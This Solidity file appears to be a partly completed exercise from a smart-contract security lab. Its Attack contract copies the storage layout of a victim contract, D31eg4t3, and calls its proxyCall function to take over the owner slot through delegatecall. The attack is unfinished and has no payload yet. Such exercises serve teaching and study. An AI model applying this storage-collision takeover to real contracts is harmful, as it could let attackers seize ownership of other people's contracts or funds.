// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {console} from "lib/forge-std/src/Test.sol";

interface ID31eg4t3 {
    function proxyCall(bytes calldata data) external returns (address);
    function changeResult() external;
}

contract Attack {
    address internal immutable victim;
    // TODO: Declare some variable here
    // Note: Checkout the storage layout in victim contract

    // Align storage slots with D31eg4t3 up to the owner variable
    uint256 internal dummy0; // align with var0
    uint8 internal dummy1; // align with var1
    string internal dummy2; // align with var2
    address internal dummy3; // align with var3
    uint8 internal dummy4; // align with var4
    address public owner; // align with owner (slot 5)


    constructor(address addr) payable {
        victim = addr; // address(delegate)
        owner = address(this);
        console.log(victim);
        console.log(owner);
    }

    // NOTE: You might need some malicious function here

    function exploit() external {
        // TODO: Add your implementation here
        // Note: Make sure you know how delegatecall works
        // bytes memory data = ...
        bytes memory data = abi.encodeWithSelector(ID31eg4t3.proxyCall.selector);
        (bool success,) = victim.call(data);
        require(success, "Delegatecall failed");
    }
}
